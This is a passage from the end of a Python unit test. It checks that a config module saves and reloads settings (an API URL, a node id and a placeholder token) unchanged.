            config.save_settings(config.Settings('http://h:5000/api', 'PC', 'ssn_abc'))
            loaded = config.load_settings()
        self.assertEqual((loaded.api, loaded.node_id, loaded.token), ('http://h:5000/api', 'PC', 'ssn_abc'))


if __name__ == '__main__':
    unittest.main()
